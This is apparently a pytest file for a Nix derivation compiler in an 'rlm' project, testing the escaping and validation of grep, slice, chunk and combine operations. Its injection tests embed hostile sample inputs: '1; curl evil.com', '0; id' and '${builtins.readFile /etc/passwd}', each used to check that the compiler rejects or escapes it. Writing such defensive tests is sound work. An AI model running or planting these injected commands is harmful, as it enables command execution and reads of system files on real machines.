"""Tests for Nix derivation compiler — validates string output without Nix."""

import pytest

from rlm.nix.compiler import NixCompileError, compile_operation
from rlm.types import OpType, Operation


FAKE_STORE = {
    "context": "/nix/store/abc123-context",
    "filtered": "/nix/store/def456-filtered",
    "chunks": "/nix/store/ghi789-chunks",
}


class TestGrepCompilation:
    def test_basic(self):
        op = Operation(op=OpType.GREP, args={"input": "context", "pattern": "User: 123"})
        nix = compile_operation(op, FAKE_STORE)
        assert "rlm-grep-" in nix
        assert "User: 123" in nix
        assert "/nix/store/abc123-context" in nix
        assert "grep" in nix

    def test_escapes_pattern(self):
        op = Operation(op=OpType.GREP, args={"input": "context", "pattern": "it's $HOME"})
        nix = compile_operation(op, FAKE_STORE)
        assert "\\$HOME" in nix

    def test_pattern_passed_as_attribute(self):
        """Pattern should be a Nix attribute, not inline in the shell script."""
        op = Operation(op=OpType.GREP, args={"input": "context", "pattern": "test"})
        nix = compile_operation(op, FAKE_STORE)
        assert 'pattern = "test";' in nix
        assert '"$pattern"' in nix

    def test_escapes_nix_interpolation(self):
        """${...} in patterns must not trigger Nix string interpolation."""
        op = Operation(op=OpType.GREP, args={"input": "context", "pattern": "${builtins.readFile /etc/passwd}"})
        nix = compile_operation(op, FAKE_STORE)
        assert "\\${builtins.readFile" in nix
        assert 'pattern = "' in nix

    def test_escapes_double_quotes(self):
        op = Operation(op=OpType.GREP, args={"input": "context", "pattern": 'say "hello"'})
        nix = compile_operation(op, FAKE_STORE)
        assert 'say \\"hello\\"' in nix

    def test_escapes_backslashes(self):
        op = Operation(op=OpType.GREP, args={"input": "context", "pattern": "a\\b"})
        nix = compile_operation(op, FAKE_STORE)
        assert "a\\\\b" in nix


class TestSliceCompilation:
    def test_basic(self):
        op = Operation(op=OpType.SLICE, args={"input": "context", "start": 0, "end": 100})
        nix = compile_operation(op, FAKE_STORE)
        assert "rlm-slice-" in nix
        assert "tail" in nix
        assert "head" in nix

    def test_rejects_string_start(self):
        """String values for start must be rejected to prevent shell injection."""
        op = Operation(op=OpType.SLICE, args={"input": "context", "start": "0; id", "end": 100})
        with pytest.raises(NixCompileError, match="must be an integer"):
            compile_operation(op, FAKE_STORE)

    def test_rejects_string_end(self):
        op = Operation(op=OpType.SLICE, args={"input": "context", "start": 0, "end": "100; id"})
        with pytest.raises(NixCompileError, match="must be an integer"):
            compile_operation(op, FAKE_STORE)


class TestCountCompilation:
    def test_lines(self):
        op = Operation(op=OpType.COUNT, args={"input": "context", "mode": "lines"})
        nix = compile_operation(op, FAKE_STORE)
        assert "rlm-count-" in nix
        assert "wc -l" in nix

    def test_chars(self):
        op = Operation(op=OpType.COUNT, args={"input": "context", "mode": "chars"})
        nix = compile_operation(op, FAKE_STORE)
        assert "wc -c" in nix


class TestChunkCompilation:
    def test_basic(self):
        op = Operation(op=OpType.CHUNK, args={"input": "context", "n": 4})
        nix = compile_operation(op, FAKE_STORE)
        assert "rlm-chunk-" in nix
        assert "split" in nix
        assert "4" in nix

    def test_rejects_string_n(self):
        """String values for n must be rejected to prevent shell injection."""
        op = Operation(op=OpType.CHUNK, args={"input": "context", "n": "1; curl evil.com"})
        with pytest.raises(NixCompileError, match="must be an integer"):
            compile_operation(op, FAKE_STORE)

    def test_rejects_zero_n(self):
        op = Operation(op=OpType.CHUNK, args={"input": "context", "n": 0})
        with pytest.raises(NixCompileError, match="positive integer"):
            compile_operation(op, FAKE_STORE)

    def test_rejects_negative_n(self):
        op = Operation(op=OpType.CHUNK, args={"input": "context", "n": -1})
        with pytest.raises(NixCompileError, match="positive integer"):
            compile_operation(op, FAKE_STORE)


class TestCombineCompilation:
    def test_concat(self):
        op = Operation(
            op=OpType.COMBINE,
            args={"inputs": ["context", "filtered"], "strategy": "concat"},
        )
        nix = compile_operation(op, FAKE_STORE)
        assert "rlm-combine-" in nix
        assert "/nix/store/abc123-context" in nix
        assert "/nix/store/def456-filtered" in nix

    def test_sum(self):
        op = Operation(
            op=OpType.COMBINE,
            args={"inputs": ["context", "filtered"], "strategy": "sum"},
        )
        nix = compile_operation(op, FAKE_STORE)
        assert "rlm-combine-sum-" in nix
        assert "total" in nix


class TestUnsupportedOps:
    def test_rlm_call_raises(self):
        op = Operation(op=OpType.RLM_CALL, args={"query": "test", "context": "context"})
        with pytest.raises(NixCompileError, match="orchestrator-level"):
            compile_operation(op, FAKE_STORE)

    def test_map_raises(self):
        op = Operation(op=OpType.MAP, args={"prompt": "test", "input": "context"})
        with pytest.raises(NixCompileError, match="orchestrator-level"):
            compile_operation(op, FAKE_STORE)


class TestNixNotInstalled:
    def test_use_nix_without_nix_raises(self):
        """When --use-nix is set but Nix isn't installed, should raise clear error."""
        from unittest.mock import patch

        from rlm.types import RLMConfig

        try:
            from rlm.orchestrator import RLMOrchestrator
        except ImportError as e:
            pytest.skip(f"Cannot import orchestrator (missing native dep): {e}")

        config = RLMConfig(use_nix=True)
        with patch("rlm.nix.builder.NixBuilder.available", new_callable=lambda: property(lambda self: False)):
            with pytest.raises(RuntimeError, match="not installed"):
                RLMOrchestrator(config)
